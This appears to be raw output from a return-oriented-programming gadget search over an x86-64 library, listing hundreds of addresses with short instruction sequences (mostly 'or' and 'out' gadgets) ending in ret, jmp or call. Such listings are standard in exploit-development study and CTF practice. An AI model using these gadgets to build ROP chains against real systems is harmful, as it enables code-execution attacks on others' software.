0x00002aaaaab6302c : or eax, 0x8d48c300 ; add eax, 0xe1f9a ; ret
0x00002aaaaab461f4 : or eax, 0xc2890000 ; jmp 0x7118e
0x00002aaaaab7d117 : or eax, 0xc634900 ; xchg eax, ebx ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaac3d044 : or eax, 0xd4a8d48 ; jne 0x16823b ; ret
0x00002aaaaab7ab51 : or eax, 0xd7f8d48 ; jne 0xa628b ; ret
0x00002aaaaab7c205 : or eax, 0xd7f8d48 ; jne 0xa7a9b ; ret
0x00002aaaaac51579 : or eax, 0xdbf0000 ; add byte ptr [rax], al ; ret 0xd
0x00002aaaaac2594d : or eax, 0xe067290f ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x00002aaaaac594d3 : or eax, 0xeeb0f650 ; fcmovb st(0), st(3) ; ret
0x00002aaaaabd7a7e : or eax, 0xf6310000 ; mov rdi, r15 ; call rbx
0x00002aaaaac2f833 : or eax, 0xf7f0ff3 ; ret
0x00002aaaaab02b93 : or eax, 0xf8834800 ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaab09f14 : or eax, 0xffff8000 ; inc eax ; shr eax, 0x1f ; ret
0x00002aaaaab2e879 : or eax, 0xfffff834 ; add rax, rcx ; jmp rax
0x00002aaaaaaf4aff : or eax, 0xffffffff ; cmp r9, rax ; je 0x1faac ; jmp 0x1fad5
0x00002aaaaab0a77d : or eax, 0xffffffff ; ret
0x00002aaaaab53807 : or eax, 1 ; mov qword ptr [rdi + 0x58], rcx ; mov dword ptr [rdi + 4], eax ; ret
0x00002aaaaac793bf : or eax, dword ptr [r14 + rcx + 0x18] ; ret
0x00002aaaaac28c7b : or eax, dword ptr [rax + rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab71e2c : or eax, dword ptr [rax] ; add bh, dh ; ret 0
0x00002aaaaab2c44f : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac1928d : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1bdd1 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac192b1 : or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaaae2d98 : or eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 6
0x00002aaaaab102db : or eax, dword ptr [rax] ; add byte ptr [rax], al ; mov word ptr [rsi + 0xc], ax ; xor eax, eax ; ret
0x00002aaaaac01d82 : or eax, dword ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaac90ac3 : or eax, dword ptr [rax] ; mov al, 0xa ; sbb byte ptr [rax], al ; add al, ah ; or ch, byte ptr [rsi] ; ret 0xb
0x00002aaaaaba2127 : or eax, dword ptr [rax] ; mov esi, esi ; movsxd rdx, dword ptr [rax + rsi*4] ; add rax, rdx ; jmp rax
0x00002aaaaaba6639 : or eax, dword ptr [rax] ; movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x00002aaaaaba5ffc : or eax, dword ptr [rax] ; movsxd rdx, dword ptr [rax + r14*4] ; add rax, rdx ; jmp rax
0x00002aaaaaba2499 : or eax, dword ptr [rax] ; movsxd rdx, dword ptr [rax + rbx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab5f6ef : or eax, dword ptr [rax] ; ret
0x00002aaaaaaff694 : or eax, dword ptr [rbx + 0x67403fe] ; pop rbx ; ret
0x00002aaaaab48234 : or eax, dword ptr [rbx + 0x674fffe] ; mov eax, 0xffffffff ; ret
0x00002aaaaabf2b2c : or eax, dword ptr [rdi] ; add byte ptr [rax - 0x77], cl ; ret 0xff31
0x00002aaaaac90fa8 : or eax, dword ptr [rdi] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0
0x00002aaaaab0b848 : or eax, dword ptr [rdx] ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaac8fc78 : or eax, dword ptr [rdx] ; mov word ptr [rdx], cs ; ret
0x00002aaaaac73d46 : or eax, dword ptr [rdx] ; ret 0x900e
0x00002aaaaac793c0 : or eax, dword ptr [rsi + rcx + 0x18] ; ret
0x00002aaaaac8444f : or eax, dword ptr [rsi + rcx + 0x38] ; ret
0x00002aaaaabdcf0f : or eax, ebx ; add rsp, 0x90 ; pop rbx ; ret
0x00002aaaaab09cb7 : or eax, ecx ; movd xmm1, eax ; movaps xmm0, xmm1 ; ret
0x00002aaaaab09928 : or eax, ecx ; movq xmm1, rax ; movapd xmm0, xmm1 ; ret
0x00002aaaaab09b67 : or eax, ecx ; sar eax, 0x1f ; not eax ; and eax, edx ; ret
0x00002aaaaab0978a : or eax, ecx ; sar rax, 0x3f ; not eax ; and eax, edx ; ret
0x00002aaaaabed810 : or eax, edi ; bswap eax ; ret
0x00002aaaaabdb966 : or eax, edi ; ret
0x00002aaaaab6ad0e : or eax, edx ; bsf rax, rax ; lea rax, qword ptr [rdi + rax] ; ret
0x00002aaaaab09f33 : or eax, edx ; mov dword ptr [rsp + 0x10], eax ; fld xword ptr [rsp + 8] ; ret
0x00002aaaaaaf557a : or eax, edx ; mov qword ptr [rcx + 0x968], rax ; ret
0x00002aaaaab09a65 : or eax, edx ; movq xmm0, rax ; ret
0x00002aaaaabdb9a2 : or eax, edx ; or rax, rsi ; or rax, rdi ; ret
0x00002aaaaab0f68f : or eax, edx ; ret
0x00002aaaaab0a044 : or eax, esi ; je 0x34ff1 ; ret
0x00002aaaaabdb9a5 : or eax, esi ; or rax, rdi ; ret
0x00002aaaaab691ac : or eax, esp ; mov qword ptr [r10 + 0x18], r8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab51884 : or ebp, dword ptr [rbx] ; push rax ; sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x00002aaaaab42f38 : or ebp, eax ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab48ce0 : or ebp, eax ; ret 0xfabb
0x00002aaaaabd4be3 : or ebp, ebx ; and ecx, dword ptr [rdi] ; mov cl, 0x35 ; ret
0x00002aaaaac46f78 : or ebp, edi ; dec dword ptr [rax - 0x77] ; out dx, eax ; add rdi, qword ptr [r13 + 0x10] ; call r12
0x00002aaaaab44dc4 : or ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaabe0dac : or ebx, dword ptr [rbx - 0x77] ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaac90882 : or ebx, eax ; add dword ptr [rbx], eax ; cmc ; add al, byte ptr [rax] ; ret
0x00002aaaaac2f9f3 : or ebx, esi ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaab4aade : or ebx, esi ; ret
0x00002aaaaac0c784 : or ecx, dword ptr [rax + 5] ; test al, 0 ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaab57d7a : or ecx, dword ptr [rax - 0x3f] ; out dx, al ; add ecx, dword ptr [rax - 0x77] ; ret 0xce31
0x00002aaaaab53cd4 : or ecx, dword ptr [rax - 0x3f] ; out dx, eax ; add ecx, dword ptr [rax - 0x77] ; ret 0xcf31
0x00002aaaaab455c4 : or ecx, dword ptr [rax - 0x73] ; add al, 0x48 ; mov dword ptr [rax], ecx ; mov eax, dword ptr [rdx] ; ret
0x00002aaaaab7ab0f : or ecx, dword ptr [rax - 0x73] ; jg 0xa5b2a ; jne 0xa628b ; ret
0x00002aaaaab7c1c3 : or ecx, dword ptr [rax - 0x73] ; jg 0xa71de ; jne 0xa7a9b ; ret
0x00002aaaaab42e34 : or ecx, dword ptr [rax - 0x75] ; and al, 8 ; add rsp, 0x18 ; ret
0x00002aaaaab95d5e : or ecx, dword ptr [rax - 0x77] ; fimul dword ptr [rax - 0x7d] ; ret
0x00002aaaaab44fb7 : or ecx, dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x94 ; ret 0xdaf7
0x00002aaaaabe09bb : or ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaabd3e67 : or ecx, dword ptr [rax - 0x7d] ; ret 0x4808
0x00002aaaaabe508d : or ecx, dword ptr [rax - 0x7d] ; ret 0x4830
0x00002aaaaabc164b : or ecx, dword ptr [rax - 0x7d] ; ret 0xf01
0x00002aaaaaaf9bbd : or ecx, dword ptr [rax - 0x7d] ; rol byte ptr [rax + rcx*2], 0x83 ; ret
0x00002aaaaab520a9 : or ecx, dword ptr [rax] ; pop rbx ; ret
0x00002aaaaab12479 : or ecx, dword ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab80044 : or ecx, dword ptr [rbx + 0x463b2847] ; sub byte ptr [rbp + 0x63], dh ; ret
0x00002aaaaab80094 : or ecx, dword ptr [rbx + 0x463b3847] ; cmp byte ptr [rbp + 0x13], dh ; ret
0x00002aaaaabe226e : or ecx, dword ptr [rcx - 0x77] ; xor cl, byte ptr [rdi] ; mov dh, 0x4f ; add dword ptr [rcx - 0x7d], ecx ; ret 0x8408
0x00002aaaaab7ab13 : or ecx, dword ptr [rdi] ; test dword ptr [rsi + 7], esp ; add byte ptr [rax], al ; ret
0x00002aaaaac76a3e : or ecx, dword ptr [rdx + 0xa] ; ret
0x00002aaaaab62b62 : or ecx, dword ptr [rdx + 0xc38034a] ; or al, 0x75 ; fisttp qword ptr [rax - 1] ; ret 0xff48
0x00002aaaaab0b75e : or ecx, dword ptr [rdx + rax*8] ; mov qword ptr [rdi + rax*8], rcx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab7b708 : or ecx, dword ptr [rsi] ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab68ee4 : or ecx, edx ; mov qword ptr [rdi], r9 ; pop rbx ; ret
0x00002aaaaaba1ddb : or edi, dword ptr [rax + 0xfde8] ; jne 0xccdb4 ; ret
0x00002aaaaabe2ddc : or edi, dword ptr [rax + 1] ; ret
0x00002aaaaac021b4 : or edi, dword ptr [rax + 2] ; ret
0x00002aaaaabe7714 : or edi, dword ptr [rax + 7] ; ret
0x00002aaaaabe8146 : or edi, dword ptr [rcx] ; ret 0xf7e
0x00002aaaaab0a1a2 : or edi, eax ; mov word ptr [rsp - 2], di ; fldcw word ptr [rsp - 2] ; ret
0x00002aaaaac4878d : or edi, edi ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaab7e4a7 : or edi, edi ; loope 0xa951a ; nop dword ptr [rax + rax] ; ret
0x00002aaaaabd719b : or edi, edx ; int1 ; dec dword ptr [rcx - 0x75] ; cmp al, 0x24 ; call rbx
0x00002aaaaac46d46 : or edi, esi ; fadd st(3) ; nop word ptr [rax + rax] ; ret
0x00002aaaaac69809 : or edi, esp ; inc dword ptr [rax + 0x10fffc0d] ; add ah, bh ; call rax
0x00002aaaaabe6c70 : or edx, 0x89480007 ; ret 0x894c
0x00002aaaaaba1dd9 : or edx, eax ; or edi, dword ptr [rax + 0xfde8] ; jne 0xccdb6 ; ret
0x00002aaaaac8bc32 : or esi, dword ptr [r14 + r9 + 0x18] ; ret
0x00002aaaaac76a76 : or esi, dword ptr [rbx + 0xa] ; ret
0x00002aaaaac75868 : or esi, dword ptr [rbx + 0xe] ; nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00002aaaaabffdf4 : or esi, dword ptr [rcx] ; ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab93501 : or esi, dword ptr [rsi + 0x30] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac8bc33 : or esi, dword ptr [rsi + rcx + 0x18] ; ret
0x00002aaaaac7c0c9 : or esi, eax ; jmp rbx
0x00002aaaaab1f09b : or esi, eax ; mov eax, 1 ; mov qword ptr [rdi], rsi ; ret
0x00002aaaaabd076e : or esi, eax ; xor eax, eax ; mov dword ptr [rdi + 8], esi ; ret
0x00002aaaaac6bd71 : or esi, ebp ; call rsp
0x00002aaaaac2f913 : or esi, ebx ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaabcb104 : or esi, ebx ; ret
0x00002aaaaab42de4 : or esp, dword ptr [rax] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac48731 : or esp, dword ptr [rax] ; and eax, 0x5be17500 ; ret
0x00002aaaaab4d9d1 : or esp, dword ptr [rax] ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaaad7f97 : or esp, dword ptr [rdx] ; js 0x2f51 ; sub ebx, dword ptr [rsp + rax*2] ; nop ; ret 0x5bdb
0x00002aaaaabcf9b4 : or esp, dword ptr [rsi - 0x77] ; push rsi ; xor ax, ax ; ret
0x00002aaaaab1243c : or qword ptr [rbp - 0x57f2faf], rcx ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab0af42 : or qword ptr [rdi + rax*8], rdx ; xor eax, eax ; ret
0x00002aaaaab0b085 : or qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaac3cfc5 : or qword ptr [rdi], rcx ; test dword ptr [rbx + 2], esp ; add byte ptr [rax], al ; ret
0x00002aaaaab73077 : or r10b, r9b ; jne 0x9e06b ; cmp r8d, ecx ; je 0x9e06b ; ret
0x00002aaaaab4d0e7 : or r11b, bpl ; xchg eax, edx ; mov edx, eax ; jmp 0x78085
0x00002aaaaac2fa62 : or r11b, r14b ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaab80c92 : or r11b, r8b ; nop dword ptr [rax] ; lea rax, qword ptr [rdi + 0xc] ; ret
0x00002aaaaac2f9f2 : or r11d, r14d ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac2f982 : or r14b, r11b ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac76a75 : or r14d, dword ptr [r11 + 0xa] ; ret
0x00002aaaaac75867 : or r14d, dword ptr [r11 + 0xe] ; nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00002aaaaac761b3 : or r14d, dword ptr [rbx + 0xe] ; nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x00002aaaaac2f912 : or r14d, r11d ; movq qword ptr [rdi], mm1 ; ret
0x00002aaaaac10016 : or r15b, r15b ; push rax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaab691ab : or r8, r12 ; mov qword ptr [r10 + 0x18], r8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcfae6 : or r8b, r13b ; ret
0x00002aaaaac8fc77 : or r8d, dword ptr [r10] ; mov word ptr [rdx], cs ; ret
0x00002aaaaac8444e : or r8d, dword ptr [r14 + r9 + 0x38] ; ret
0x00002aaaaab0a043 : or r8d, esi ; je 0x34ff2 ; ret
0x00002aaaaab68ee3 : or r9, r10 ; mov qword ptr [rdi], r9 ; pop rbx ; ret
0x00002aaaaabaeb42 : or r9b, al ; out dx, al ; or byte ptr [rcx - 0x77], al ; ret 0xff25
0x00002aaaaaafed93 : or r9b, byte ptr [r8 + 0x39] ; ret 0x4676
0x00002aaaaac76a3d : or r9d, dword ptr [r10 + 0xa] ; ret
0x00002aaaaac3d047 : or rax, 0x1e1850f ; add byte ptr [rax], al ; ret
0x00002aaaaab41231 : or rax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab41959 : or rax, 0x401f0f08 ; add byte ptr [rax - 0x7d], cl ; ret 0x8b04
0x00002aaaaab124b0 : or rax, 0x80d0518d ; cli ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaaaf4afe : or rax, 0xffffffffffffffff ; cmp r9, rax ; je 0x1faad ; jmp 0x1fad6
0x00002aaaaab0a77c : or rax, 0xffffffffffffffff ; ret
0x00002aaaaac8e756 : or rax, qword ptr [r14 + r9 + 0x38] ; ret
0x00002aaaaac21232 : or rax, qword ptr [r8] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaab0b847 : or rax, qword ptr [rdx] ; mov qword ptr [rdi], rax ; xor eax, eax ; ret
0x00002aaaaab09789 : or rax, rcx ; sar rax, 0x3f ; not eax ; and eax, edx ; ret
0x00002aaaaabdb9a7 : or rax, rdi ; ret
0x00002aaaaab6ad0d : or rax, rdx ; bsf rax, rax ; lea rax, qword ptr [rdi + rax] ; ret
0x00002aaaaaaf5579 : or rax, rdx ; mov qword ptr [rcx + 0x968], rax ; ret
0x00002aaaaab09a64 : or rax, rdx ; movq xmm0, rax ; ret
0x00002aaaaab0f68e : or rax, rdx ; ret
0x00002aaaaabdb9a4 : or rax, rsi ; or rax, rdi ; ret
0x00002aaaaab12478 : or rcx, qword ptr [rbp - 0x57f2faf] ; or cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xb60f
0x00002aaaaab0b75d : or rcx, qword ptr [rdx + rax*8] ; mov qword ptr [rdi + rax*8], rcx ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab1f09a : or rsi, rax ; mov eax, 1 ; mov qword ptr [rdi], rsi ; ret
0x00002aaaaac02293 : or sil, sil ; ret 0x8802
0x00002aaaaac698c4 : or spl, dil ; inc dword ptr [rax + 0xa] ; cld ; inc dword ptr [rax + 0xc] ; cld ; call rax
0x00002aaaaab09800 : orpd xmm0, xmm1 ; ret
0x00002aaaaab09801 : orps xmm0, xmm1 ; ret
0x00002aaaaab09bce : orps xmm0, xmm3 ; ret
0x00002aaaaabfcad1 : out -0x18, eax ; cdq ; xor dh, dh ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaac08534 : out -0x18, eax ; cmpsb byte ptr [rsi], byte ptr [rdi] ; ret 0xffee
0x00002aaaaabe6452 : out -0x18, eax ; cwde ; ret
0x00002aaaaabd8d23 : out -0x18, eax ; jg 0x103cec ; int1 ; dec dword ptr [rax - 0x75] ; jge 0x103d37 ; call rbx
0x00002aaaaabca1d2 : out -0x18, eax ; push -0x76000003 ; ret 0xcb8
0x00002aaaaaba0a77 : out -0x18, eax ; ret
0x00002aaaaac58380 : out -0x31, eax ; movsb byte ptr [rdi], byte ptr [rsi] ; in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x00002aaaaabd23ad : out -0x75, eax ; sub al, 0 ; add rsp, 8 ; ret
0x00002aaaaab3fa52 : out -0x77, eax ; push rsp ; and al, 0xc ; call 0xf6d07
0x00002aaaaab0e905 : out -0x77, eax ; ret
0x00002aaaaab052fe : out -0x77, eax ; ret 0x8948
0x00002aaaaabc5889 : out -0x77, eax ; ret 0x8b48
0x00002aaaaab02f33 : out -0x80, eax ; sete al ; ret
0x00002aaaaac5a0a8 : out -0xb, eax ; mov ch, 0xab ; ret
0x00002aaaaac831a9 : out -0xc, eax ; jmp qword ptr [rcx]
0x00002aaaaac2f27a : out -0xd, eax ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaac69951 : out -5, eax ; call qword ptr [rax]
0x00002aaaaac6c1f5 : out 0, al ; add byte ptr [rax + rdi*2], al ; out dx, al ; call rsp
0x00002aaaaac6c215 : out 0, eax ; add ah, dl ; jl 0x19720f ; jmp rsp
0x00002aaaaac7e6f5 : out 0, eax ; add byte ptr [rax], ch ; out dx, eax ; int1 ; jmp rcx
0x00002aaaaabed819 : out 0x10, eax ; movzx eax, si ; or eax, edi ; bswap eax ; ret
0x00002aaaaabed82b : out 0x18, eax ; and eax, 0xffffff ; or eax, edi ; bswap eax ; ret
0x00002aaaaabdb9a0 : out 0x20, eax ; or eax, edx ; or rax, rsi ; or rax, rdi ; ret
0x00002aaaaabe6ac1 : out 0x31, eax ; shr al, 0xb7 ; ret
0x00002aaaaab08e89 : out 0x41, al ; mov eax, dword ptr [rcx + rdx*4 + 8] ; add rax, qword ptr [rdi + 0x20] ; ret
0x00002aaaaabe9500 : out 0x41, eax ; and ebx, 0xffffffbb ; cmp r11d, 0xa ; je 0x114517 ; ret
0x00002aaaaab0c30b : out 0x41, eax ; call rdi
0x00002aaaaab1f07b : out 0x48, al ; mov dword ptr [rdi], esi ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaab0c31c : out 0x48, al ; mov edi, dword ptr [rsp + 0x20] ; call r15
0x00002aaaaab5af86 : out 0x48, al ; mov edi, eax ; pop rbx ; pop rbp ; pop r12 ; jmp rcx
0x00002aaaaabc8453 : out 0x48, al ; mov edi, ebp ; call 0xef756
0x00002aaaaab0c345 : out 0x48, al ; mov edi, ebp ; call r15
0x00002aaaaab5d152 : out 0x48, al ; mov edi, ebp ; call rax
0x00002aaaaabfee2c : out 0x48, al ; mov edi, ebp ; mov rcx, r13 ; call rbx
0x00002aaaaac02b86 : out 0x48, al ; mov edi, ebx ; call qword ptr [rax]
0x00002aaaaab5c2b4 : out 0x48, al ; mov edi, ebx ; call rax
0x00002aaaaabfea20 : out 0x48, al ; mov edi, ebx ; mov r13, rsp ; call r15
0x00002aaaaab80130 : out 0x48, eax ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab1d4c8 : out 0x48, eax ; mov eax, edx ; ret
0x00002aaaaabd36d5 : out 0x49, eax ; mov eax, edi ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaac448e6 : out 0x4b, al ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaaba5cbf : out 0x4c, eax ; mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5d2a7 : out 0x4c, eax ; mov edx, ebp ; mov rsi, rbp ; call rax
0x00002aaaaabfe5ef : out 0x4c, eax ; mov esi, esi ; call 0x558b6
0x00002aaaaab81d6b : out 0x4d, eax ; mov ecx, edi ; call rbx
0x00002aaaaaad6b16 : out 0x59, eax ; pop rbx ; ret 0x2a63
0x00002aaaaab5a4ae : out 0x5b, al ; pop rbp ; pop r12 ; jmp rax
0x00002aaaaab50fd3 : out 0x5b, al ; ret
0x00002aaaaac0d338 : out 0x5b, eax ; ret
0x00002aaaaab5ac8b : out 0x5d, al ; pop r12 ; jmp rax
0x00002aaaaab4c4f6 : out 0x7f, al ; cmp esi, 2 ; je 0x77512 ; mov dword ptr [rdi], edx ; ret
0x00002aaaaaad747e : out 0xa9, al ; ret 0xbd07
0x00002aaaaaad587d : out 0xc, eax ; movabs eax, dword ptr [0x10c0449000e] ; ret 0x440c
0x00002aaaaab738ea : out 0xc6, al ; add al, 3 ; add byte ptr [rax - 0x77], cl ; fisttp word ptr [rax - 0x77] ; ret 0xc6e8
0x00002aaaaabca9d1 : out 0xe8, al ; fld dword ptr [rcx] ; cli ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaac0ebee : out 0xe8, al ; jl 0x139c56 ; out dx, al ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaabc8f7f : out 0xe8, al ; jnp 0xf3fdd ; stc ; dec dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x84 ; ret 0xa
0x00002aaaaabec18d : out 0xe8, al ; lodsd eax, dword ptr [rsi] ; ret 0xfff5
0x00002aaaaabc0027 : out 0xe8, al ; ret
0x00002aaaaab86288 : out 0xe8, al ; ret 0x594
0x00002aaaaaba1821 : out 0xe8, al ; test eax, 0x39fffffe ; ret
0x00002aaaaac7b229 : out 0xee, al ; call qword ptr [rax]
0x00002aaaaab57740 : out 0xf, al ; xchg byte ptr [rcx], ah ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaac2f1fa : out 0xf3, al ; movq qword ptr [rdi - 0x10], mm1 ; ret
0x00002aaaaab69e09 : out 0xf3, al ; ret
0x00002aaaaac83149 : out 0xf4, al ; jmp qword ptr [rbx]
0x00002aaaaac6dd31 : out 0xf6, al ; call rsp
0x00002aaaaac6e551 : out 0xf7, al ; dec esp ; ret
0x00002aaaaac6e559 : out 0xf7, al ; jmp rsp
0x00002aaaaab44734 : out 0xff, al ; push rax ; cmp byte ptr [rax + 0x39], cl ; ret
0x00002aaaaac8e5a5 : out 1, al ; add al, bh ; push rdi ; call qword ptr [rdx]
0x00002aaaaac91608 : out 1, eax ; add byte ptr [rax], al ; ret 4
0x00002aaaaac2b2f4 : out 3, al ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac2b1a4 : out 3, eax ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabf83fc : out 4, al ; lea eax, dword ptr [rsi + 8] ; ret
0x00002aaaaabf859d : out 4, al ; lea rax, qword ptr [rdi + rsi + 8] ; ret
0x00002aaaaaaf58f1 : out 4, eax ; add rdi, rbp ; call rax
0x00002aaaaabed80a : out 8, eax ; movzx eax, sil ; or eax, edi ; bswap eax ; ret
0x00002aaaaabf25c3 : out dx, al ; adc bh, dh ; ret 0x8080
0x00002aaaaab68d59 : out dx, al ; adc byte ptr [rax - 0x75], cl ; sbb byte ptr [rax - 0x7d], r9b ; ret 0x4802
0x00002aaaaac02759 : out dx, al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, eax ; call qword ptr [rbx]
0x00002aaaaab1cd66 : out dx, al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], al ; ret 0xc083
0x00002aaaaac6c2ad : out dx, al ; add byte ptr [rax], al ; hlt ; fldz ; call rsp
0x00002aaaaac7eddd : out dx, al ; add byte ptr [rax], al ; xor byte ptr [rdx], cl ; call rsi
0x00002aaaaabf801f : out dx, al ; add dword ptr [rax - 0x78], eax ; ja 0x12302c ; ret
0x00002aaaaab6b7d3 : out dx, al ; add dword ptr [rbp - 0xf], esi ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab6b87b : out dx, al ; add dword ptr [rbp - 0xf], esi ; xor eax, eax ; ret
0x00002aaaaac2aaba : out dx, al ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabf801c : out dx, al ; add eax, dword ptr [rbx - 0x77bffe12] ; ja 0x12302f ; ret
0x00002aaaaab57d7d : out dx, al ; add ecx, dword ptr [rax - 0x77] ; ret 0xce31
0x00002aaaaab4ba43 : out dx, al ; call 0x4d178
0x00002aaaaac7a802 : out dx, al ; call qword ptr [rax]
0x00002aaaaac5bcfa : out dx, al ; call qword ptr [rcx - 0x12]
0x00002aaaaac7ae6a : out dx, al ; call qword ptr [rcx]
0x00002aaaaac7a882 : out dx, al ; call qword ptr [rdx]
0x00002aaaaac79cc2 : out dx, al ; call qword ptr [rsi]
0x00002aaaaab5d2ad : out dx, al ; call rax
0x00002aaaaac5bbbe : out dx, al ; call rsp
0x00002aaaaac5bc4e : out dx, al ; dec dword ptr [rax + 0x5f] ; out dx, al ; call rsp
0x00002aaaaac5bc4a : out dx, al ; dec dword ptr [rax + 0x5f] ; out dx, al ; dec dword ptr [rax + 0x5f] ; out dx, al ; call rsp
0x00002aaaaac0ebf2 : out dx, al ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac05247 : out dx, al ; dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaac0823b : out dx, al ; dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac5bd26 : out dx, al ; dec dword ptr [rdx + 0x628cffee] ; out dx, al ; jmp rsp
0x00002aaaaac5bbb6 : out dx, al ; dec eax ; pop rsi ; out dx, al ; inc dword ptr [rax + 0x5e] ; out dx, al ; call rsp
0x00002aaaaaad6b14 : out dx, al ; enter 0x59e7, 0x5b ; ret 0x2a63
0x00002aaaaac594d7 : out dx, al ; fcmovb st(0), st(3) ; ret
0x00002aaaaaad8aa1 : out dx, al ; in eax, 0x78 ; mov dl, 0x1e ; ret
0x00002aaaaac5b48a : out dx, al ; inc dword ptr [rax + 0x5a] ; out dx, al ; inc dword ptr [rax + 0x5a] ; out dx, al ; jmp qword ptr [rax]
0x00002aaaaac5b48e : out dx, al ; inc dword ptr [rax + 0x5a] ; out dx, al ; jmp qword ptr [rax]
0x00002aaaaac5bbba : out dx, al ; inc dword ptr [rax + 0x5e] ; out dx, al ; call rsp
0x00002aaaaac5c2ad : out dx, al ; int1 ; call rax
0x00002aaaaac5c2dd : out dx, al ; int1 ; inc dword ptr [rax] ; out dx, eax ; int1 ; call qword ptr [rax]
0x00002aaaaac5c2cd : out dx, al ; int1 ; inc eax ; out dx, al ; int1 ; call rax
0x00002aaaaac5c2d5 : out dx, al ; int1 ; jmp rax
0x00002aaaaac5c2c9 : out dx, al ; int1 ; push qword ptr [rax - 0x3f000e12] ; out dx, al ; int1 ; call rax
0x00002aaaaac5c2d9 : out dx, al ; int1 ; push rax ; out dx, al ; int1 ; inc dword ptr [rax] ; out dx, eax ; int1 ; call qword ptr [rax]
0x00002aaaaac5b492 : out dx, al ; jmp qword ptr [rax]
0x00002aaaaac7a632 : out dx, al ; jmp qword ptr [rcx]
0x00002aaaaac7a312 : out dx, al ; jmp qword ptr [rdi]
0x00002aaaaac7a78a : out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac5b97a : out dx, al ; jmp qword ptr [rsi]
0x00002aaaaac5b462 : out dx, al ; jmp rax
0x00002aaaaac7adb2 : out dx, al ; jmp rbx
